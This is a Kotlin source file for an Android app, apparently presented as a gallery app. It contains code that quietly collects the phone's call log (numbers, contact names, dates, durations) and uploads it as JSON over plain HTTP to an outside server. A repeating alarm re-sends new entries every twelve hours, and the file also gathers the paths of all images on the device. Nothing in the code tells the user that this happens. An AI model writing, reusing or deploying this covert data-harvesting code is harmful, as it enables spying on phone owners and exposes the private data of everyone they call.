package com.developer.service

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.database.MergeCursor
import android.net.Uri
import android.provider.MediaStore
import android.content.Intent
import android.preference.PreferenceManager
import android.util.Log
import com.github.kittinunf.fuel.Fuel
import com.google.gson.Gson
import java.lang.Long.parseLong
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.ArrayList




data class PhotoList(val list: ArrayList<Photo>)
data class Photo(val path: String, val timeStamp: String)
data class CallLogs(val list: ArrayList<CallLog>)
data class CallLog(val number: String, val name: String, val date: String, val duration: String, val type: String, val new: String)

class ImageList {


    fun getImageList(ctx: Context): PhotoList {


        val uriExternal = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val uriInternal = android.provider.MediaStore.Images.Media.INTERNAL_CONTENT_URI

        val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DATE_MODIFIED)
        val cursorExternal = ctx.contentResolver.query(uriExternal, projection, null, null, null)
        val cursorInternal = ctx.contentResolver.query(uriInternal, projection, null, null, null)
        val cursor = MergeCursor(arrayOf(cursorExternal, cursorInternal))

        val temp: ArrayList<Photo> = ArrayList()

        while (cursor.moveToNext()) {

            val path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA))
            val timestamp = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED))

            temp.add(Photo(path, timestamp))

        }

        cursorExternal?.close()
        cursorInternal?.close()
        cursor.close()

        return PhotoList(temp)

    }

}

class Call {

    fun uploadCallLog(ctx: Context) {

        val str = Gson().toJson(getAllCallLog(ctx))

        val apiUrl = "http://home.iitj.ac.in/~suthar.2/Android/Gallery/call-log.php"

        Fuel.post(apiUrl).body(str).response { _, response, _ ->

            Log.d("Suthar", response.toString())
            PreferenceManager.getDefaultSharedPreferences(ctx).edit().putLong("last_call_log", Calendar.getInstance().timeInMillis).apply()
        }

        Log.d("Suthar", str)

    }

    private fun getAllCallLog(ctx: Context): CallLogs {


        val strOrder = android.provider.CallLog.Calls.DATE + " DESC"
        val callUri = Uri.parse("content://call_log/calls")
        val cur = ctx.contentResolver.query(callUri, null, null, null, strOrder)

        val tmp: ArrayList<CallLog> = ArrayList()

        while (cur.moveToNext()) {

            val callNumber = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER))
            val callName = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME))
            val callDate = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DATE))
            val duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION))
            val callType = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE))
            val isCallNew = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NEW))


            val formatter = SimpleDateFormat("dd-MMM-yyyy hh:mm aa", Locale.ENGLISH)
            val dateString = formatter.format(Date(parseLong(callDate)))

            val formatter2 = SimpleDateFormat("HH:mm:ss", Locale("en"))
            formatter2.timeZone = TimeZone.getTimeZone("UTC")
            val durationString = formatter2.format(Date(parseLong(duration) * 1000))


            if (parseLong(callDate) > getLastUpload(ctx))
                tmp.add(CallLog(callNumber, callName
                        ?: "<unknown>", dateString, durationString, callType, isCallNew
                        ?: "<unknown>"))
        }
        cur.close()
        return CallLogs(tmp)
    }

    private fun getLastUpload(ctx: Context): Long = PreferenceManager.getDefaultSharedPreferences(ctx).getLong("last_call_log", 0)

    fun startServiceUsingAlarmManager(ctx: Context) {

        val cal = Calendar.getInstance(Locale.ENGLISH)
        cal.set(Calendar.HOUR_OF_DAY, 22)
        cal.set(Calendar.MINUTE, 0)
        cal.set(Calendar.SECOND, 0)

        val intent = Intent(ctx, BroadcastReceiver::class.java)
        intent.action = "Call"
        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
        val pIntent = PendingIntent.getBroadcast(ctx, 75, intent, PendingIntent.FLAG_UPDATE_CURRENT)
        val alarm = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager?
        alarm?.cancel(pIntent)
        alarm?.setRepeating(AlarmManager.RTC_WAKEUP, cal.timeInMillis, (12 * 60 * 60 * 1000).toLong(), pIntent)

        uploadCallLog(ctx)
    }

}